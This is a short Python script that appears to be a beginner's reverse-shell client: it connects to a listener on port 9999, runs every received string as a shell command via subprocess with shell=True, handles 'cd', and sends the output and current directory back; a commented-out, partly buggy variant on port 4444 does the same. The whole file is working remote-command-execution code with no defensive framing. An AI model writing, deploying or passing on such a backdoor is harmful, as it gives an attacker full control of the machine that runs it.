import socket
import os
import subprocess

s = socket.socket()
host = socket.gethostbyname(socket.gethostname())
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
# import socket 
# HEADER=64
# PORT=4444
# FORMAT="utf-8"
# DISCONNECT="!DISCONNECT"
# SERVER=socket.gethostbyname(socket.gethostname())
# print(SERVER)
# client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# client.connect((SERVER,PORT))

# def send(msg):
#     message=msg.encode(FORMAT)
#     msg_length=len(message)
#     send_length=str(msg_length).encode(FORMAT)
#     send_length+=b' '*(HEADER-len(send_length))
#     client.send(send_length)
#     client.send(message)
#     while True:
#         data=client.recv(HEADER)
#         if data[:2].decode(FORMAT)=='cd':
#             os.chdir(data[:3].decode(FORMAT))
#         if len(data)>0:
#             cmd=subprocess.Popen(data[:].decode(FORMAT),shell=True,stderr=subprocess.PIPE)
#             output_byte=cmd.stdout.read()+cmd.stderr.read()

#             output_str=str(output_byte,FORMAT)
#             currentWD=os.getcwd()+'>'
#             client.send(str.encode(output_str+currentWD))

#             print(output_str)
# send("dir")

